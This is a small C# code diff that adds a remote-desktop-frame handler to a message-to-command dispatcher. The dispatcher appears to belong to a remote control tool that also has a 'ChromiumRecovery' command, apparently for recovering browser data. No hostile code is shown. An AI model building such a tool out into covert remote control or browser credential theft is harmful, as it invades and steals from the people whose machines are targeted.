@@ -16,6 +16,7 @@ namespace Seacore.Resources.Core.Commands
                 DisconnectMessage => new DisconnectCommand(),
                 ReconnectMessage => new ReconnectCommand(),
                 ChromiumRecoveryMessage => new ChromiumRecoveryCommand(),
+                RemoteDesktopFrameMessage => new RemoteDesktopFrameCommand(clientInfo),
                 ClientIdentificationMessage => new ClientIdentificationCommand(clientInfo),
                 _ => new UnknownCommand(),
             };
